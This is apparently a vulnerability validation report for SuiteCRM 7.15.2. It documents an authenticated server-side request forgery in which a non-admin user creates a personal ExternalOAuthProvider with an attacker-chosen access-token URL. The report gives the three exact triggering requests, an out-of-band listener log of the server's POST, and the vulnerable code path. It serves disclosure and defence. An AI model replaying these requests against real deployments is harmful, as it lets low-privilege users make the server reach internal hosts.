# VULN-085 — Authenticated SSRF via user-settable token URL on a personal ExternalOAuthProvider

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: Medium (CVSS 6.5)
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28T20:3x Z (see run.log)

## Preconditions
- Fresh non-admin user via `_common.create_user()`; every subsequent step (create provider, authorize, callback) reuses the **same** `requests.Session` (same `PHPSESSID`) because the callback's `state` check is bound to that PHP session.
- HTTP listener on `0.0.0.0:33119` (app reaches it at `172.18.0.1:33119`), answering POSTs with a valid `{"access_token":...}` JSON body so league/oauth2-client's `getAccessToken()` completes without throwing.

## Request
Three requests as the low-priv user (`request.http`):
1. `POST /index.php` `module=ExternalOAuthProvider&action=Save` with `type=personal`, `connector=Generic`, `url_access_token=http://172.18.0.1:33119/token-<canary>`, `url_authorize=https://example.com/oauth/authorize`, and `extra_provider_params-key[]=urlResourceOwnerDetails` / `extra_provider_params-value[]=https://example.com/resource` (see Research note — required by the vendored league/oauth2-client `GenericProvider`, not itself part of the vulnerability).
2. `GET /index.php?entryPoint=redirectToExternalOAuth&provider=<id>` — obtains `state` from the `302 Location`.
3. `GET /index.php?entryPoint=setExternalOAuthToken&provider=<id>&state=<state>&code=anycode` — the actual trigger.

## Response
Request 3 → HTTP 200, body includes (`response.txt`):
```
<body>
<script>
    var data;
    const channel = new BroadcastChannel('auth');
        data = ['access_token', 'poc-access-token'];
    channel.postMessage(data);
    ...
```
`poc-access-token` is the exact literal our OOB listener's JSON response contained — round-tripped through the real league OAuth2 client and rendered into `setToken.tpl`.

## Observation
`evidence/oob_listener.log`:
```
POST /token-oauth085_94163786
  Host: 172.18.0.1:33119
  User-Agent: GuzzleHttp/7
  content-type: application/x-www-form-urlencoded
  BODY: client_id=poc-client&client_secret=poc-secret&redirect_uri=http%3A%2F%2Flocalhost%3A33116%2Fep%2FsetExternalOAuthToken&grant_type=authorization_code&code=anycode
```
`User-Agent: GuzzleHttp/7` independently confirms this was the server's own HTTP client (league/oauth2-client's default Guzzle transport), not the exploit script. Matches the static finding exactly: `ExternalOAuthConnection/entrypoint/setExternalOAuthToken.php:72` → `OAuthAuthorizationService::getAccessToken()` → `ExternalOAuthProviderConnector::getAccessToken()` → league `AbstractProvider::getAccessToken()`, which POSTs to `getBaseAccessTokenUrl()` = the bean's `url_access_token` field, with **no `validate_external_host()` call anywhere on this path**.

DB verification of the create-access claim:
```
id                                    type      connector  created_by                            url_access_token
b4658433-d317-45e6-95c7-46c14aefdd6a  personal  Generic    6fb21c1d-794a-4360-9756-08971d489ed8   http://172.18.0.1:33119/token-oauth085_94163786
```
`created_by` is exactly the freshly-created low-priv user's own id — the record was created by, and is owned by, an ordinary non-admin account with zero special grants, confirming `controller.php:62-64`'s any-user create-access and `ExternalOAuthProvider::ACLAccess()`'s personal-record self-access rule (`ExternalOAuthProvider.php:170-198`) in a live database, not just by reading the code.

## Side effects
- New throwaway `users` row and one `external_oauth_providers` row (both random-suffixed), owned entirely by the throwaway account.
- One inbound HTTP POST on the OOB listener.

## Research & references
- OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger, "Server-side request forgery (SSRF)": https://portswigger.net/web-security/ssrf
- `league/oauth2-client` `GenericProvider` source (`vendor/league/oauth2-client/src/Provider/GenericProvider.php:129-136`, confirmed by direct read inside the app container) requires `urlResourceOwnerDetails` as a constructor option or throws `InvalidArgumentException`; SuiteCRM's `ExternalOAuthProviderConnector::getProvider()` only forwards `urlAuthorize`/`urlAccessToken`/`scopes` plus whatever is in the bean's `extra_provider_params` stringmap. Supplying `urlResourceOwnerDetails` via that (also user-settable, also unvalidated) field is fixture setup to reach the vulnerable code path cleanly — it does not weaken or change the vulnerability, which is squarely the unvalidated `url_access_token`.
- Field-population mechanism: `include/MVC/Controller/SugarController.php:639-666` (`pre_save()`), which mass-assigns any posted field present in `field_defs` onto the bean regardless of the vardef's `display: readonly`/`massupdate` UI hints — the same class of gap noted elsewhere in this codebase's stage-04 findings (legacy `set_entry` control-property mass-assignment).
